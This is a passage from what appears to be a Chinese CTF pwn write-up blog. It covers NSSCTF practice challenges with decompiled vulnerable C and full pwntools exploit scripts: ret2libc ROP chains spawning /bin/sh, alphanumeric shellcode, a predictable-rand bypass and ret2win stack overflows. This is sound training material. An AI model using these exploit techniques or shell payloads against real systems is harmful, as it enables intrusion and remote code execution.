class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">	context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">	ip = <span class="string">&quot;node4.anna.nssctf.cn&quot;</span></span><br><span class="line">	port = <span class="number">28631</span></span><br><span class="line">	p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">	info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line"> </span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">rdi = rop.find_gadget([<span class="string">&#x27;pop rdi&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">ret = rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">info(<span class="string">&quot;pop rdi;ret address: &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(rdi))</span><br><span class="line">offset = <span class="number">0x60</span> + <span class="number">8</span></span><br><span class="line">payload1 = flat([ <span class="string">b&#x27;\x00&#x27;</span>+cyclic(offset-<span class="number">1</span>),rdi,elf.got[<span class="string">&#x27;puts&#x27;</span>],elf.plt[<span class="string">&#x27;puts&#x27;</span>],elf.sym[<span class="string">&#x27;main&#x27;</span>]])</span><br><span class="line">sl(payload1)</span><br><span class="line">puts_addr = get_addr()</span><br><span class="line">info(<span class="string">&quot;puts addr: &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(puts_addr))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">system_addr,bin_sh = get_sb()</span><br><span class="line"></span><br><span class="line">payload2 = flat([ <span class="string">b&#x27;\x00&#x27;</span>+cyclic(offset-<span class="number">1</span>),ret,rdi,bin_sh,system_addr])</span><br><span class="line">sl(payload2)</span><br><span class="line"></span><br><span class="line">inter()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="HNCTF-2022-Week1-safe-shellcode"><a href="#HNCTF-2022-Week1-safe-shellcode" class="headerlink" title="[HNCTF 2022 Week1]safe_shellcode"></a>[HNCTF 2022 Week1]safe_shellcode</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">	p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>):</span><br><span class="line">	p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">	p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>):</span><br><span class="line">	p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>():</span><br><span class="line">	p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>():</span><br><span class="line">	<span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line">	p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">	p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>, <span class="number">29291</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># elf = ELF(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line">s(<span class="string">&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;</span>)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>

<h3 id="LitCTF-2023-口算题卡"><a href="#LitCTF-2023-口算题卡" class="headerlink" title="[LitCTF 2023]口算题卡"></a>[LitCTF 2023]口算题卡</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">	p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>):</span><br><span class="line">	p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">	p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>):</span><br><span class="line">	p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>():</span><br><span class="line">	p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>():</span><br><span class="line">	<span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line">	p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">	p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">	<span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():</span><br><span class="line">	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">	context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">	ip = <span class="string">&quot;node4.anna.nssctf.cn&quot;</span></span><br><span class="line">	port = <span class="number">28778</span></span><br><span class="line">	p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">	info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">recv_header = p.recvuntil(<span class="string">b&quot;Have fun!\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;What is&quot;</span>)</span><br><span class="line">  </span><br><span class="line">    key = p.recvuntil(<span class="string">b&quot;?&quot;</span>)</span><br><span class="line">    payload = flat([</span><br><span class="line">        <span class="built_in">str</span>(<span class="built_in">eval</span>(key[:-<span class="number">1</span>]))</span><br><span class="line">    ])</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">eval</span>(key[:-<span class="number">1</span>]))</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="HDCTF-2023-pwnner"><a href="#HDCTF-2023-pwnner" class="headerlink" title="[HDCTF 2023]pwnner"></a>[HDCTF 2023]pwnner</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  _BYTE v3[<span class="number">64</span>]; <span class="comment">// [rsp+10h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  srand(<span class="number">0x39</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;you should prove that you love pwn,so input your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x10</span>uLL);</span><br><span class="line">  v0 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v0 == rand() )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok,you have a little cognition about pwn,so what will you do next?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, v3, <span class="number">0x100</span>uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;sorry,you are not a real pwnner&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>srand是伪随机数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">      srand(<span class="number">0x39</span>u);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,rand());</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译发现，一直输出</p>
<p>1956681178</p>
<p>所以即可栈溢出</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">	p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>):</span><br><span class="line">	p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">	p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>):</span><br><span class="line">	p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>():</span><br><span class="line">	p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>():</span><br><span class="line">	<span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line">	p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">	p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">	<span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():</span><br><span class="line">	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">	context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">	ip = <span class="string">&quot;node5.anna.nssctf.cn&quot;</span></span><br><span class="line">	port = <span class="number">24121</span></span><br><span class="line">	p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">	info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23-x64.so&#x27;)</span></span><br><span class="line">data = subprocess.run(<span class="string">&#x27;./main&#x27;</span>,shell=<span class="literal">True</span>,stdout=subprocess.PIPE).stdout</span><br><span class="line">sl(data)</span><br><span class="line">offset = <span class="number">0x40</span> + <span class="number">8</span></span><br><span class="line">payload = cyclic(offset) + p64(elf.sym[<span class="string">&#x27;get_shell&#x27;</span>]+<span class="number">1</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>

<h2 id="11-10"><a href="#11-10" class="headerlink" title="11.10"></a>11.10</h2><h3 id="MoeCTF-2022-shell"><a href="#MoeCTF-2022-shell" class="headerlink" title="[MoeCTF 2022]shell"></a>[MoeCTF 2022]shell</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to PWN world!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;In PWN, your goal is to get shell.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Here I&#x27;ll give you the shell as a gift for our first meeting.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Have fun in the following trip!&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接连接即可</p>
<h3 id="HGAME-2023-week1-easy-overflow"><a href="#HGAME-2023-week1-easy-overflow" class="headerlink" title="[HGAME 2023 week1]easy_overflow"></a>[HGAME 2023 week1]easy_overflow</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">b4ckd0or</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">	context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">	ip = <span class="string">&quot;node5.anna.nssctf.cn&quot;</span></span><br><span class="line">	port = <span class="number">24254</span></span><br><span class="line">	p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">	info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line"> </span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23-x64.so&#x27;)</span></span><br><span class="line">offset = <span class="number">0x10</span> + <span class="number">8</span></span><br><span class="line">payload = flat([cyclic(offset),<span class="number">0x00000000040117B</span>])</span><br><span class="line">sl(payload)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> flag&gt;&amp;2</span><br><span class="line">NSSCTF&#123;2e156d0c-2961-4dae-bbd5-12f743d1cf1e&#125;</span><br></pre></td></tr></table></figure>

<p>​<code>exec 1&gt;&amp;0</code>​输出重定向</p>
<h3 id="UUCTF-2022-新生赛-babystack"><a href="#UUCTF-2022-新生赛-babystack" class="headerlink" title="[UUCTF 2022 新生赛]babystack"></a>[UUCTF 2022 新生赛]babystack</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> 